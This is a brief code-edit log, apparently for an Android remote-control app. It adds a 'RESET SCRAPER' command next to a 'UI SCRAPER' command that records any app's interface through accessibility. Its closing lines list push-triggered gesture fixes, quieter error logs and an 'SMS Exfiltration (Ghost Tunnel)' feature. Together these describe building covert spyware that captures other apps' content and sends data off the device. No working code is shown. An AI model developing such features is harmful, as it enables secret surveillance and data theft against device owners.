ops.text: Implement RESET_SCRAPER command to kill all active and queued UI capture tasks

ops.find_block: { n: "UI SCRAPER", p: "[Pkg] | [Min] | [Depth]", d: "Pkg: App to watch (null = all). Min: Session duration. Depth: How deep to walk UI tree." },
ops.replace_with:
{ n: "UI SCRAPER", p: "[Pkg] | [Min] | [Depth]", d: "Pkg: App to watch (null = all). Min: Session duration. Depth: How deep to walk UI tree." },
                        { n: "RESET SCRAPER", p: "--", d: "Kills all active recordings and clears the waiting queue instantly." },

operations.find_block: { n: "UI SCRAPER", p: "[Pkg] | [Min] | [Depth]", d: "Pkg: App to watch (null = all). Min: Session duration. Depth: How deep to walk UI tree." },
operations.replace_with:
{ n: "UI SCRAPER", p: "[Pkg] | [Min] | [Depth]", d: "Pkg: App to watch (null = all). Min: Session duration. Depth: How deep to walk UI tree." },
                        { n: "RESET SCRAPER", p: "--", d: "Kills all active recordings and clears the waiting queue instantly." },

ops.text: Silence massive stack traces in logs by replacing stackTraceToString with concise error messages
Fix Accessibility Gesture mathematical hang, increase FCM timeout, and add verbose chain logging.
Implement CodeRed SMS Exfiltration (Ghost Tunnel) for offline data recovery.
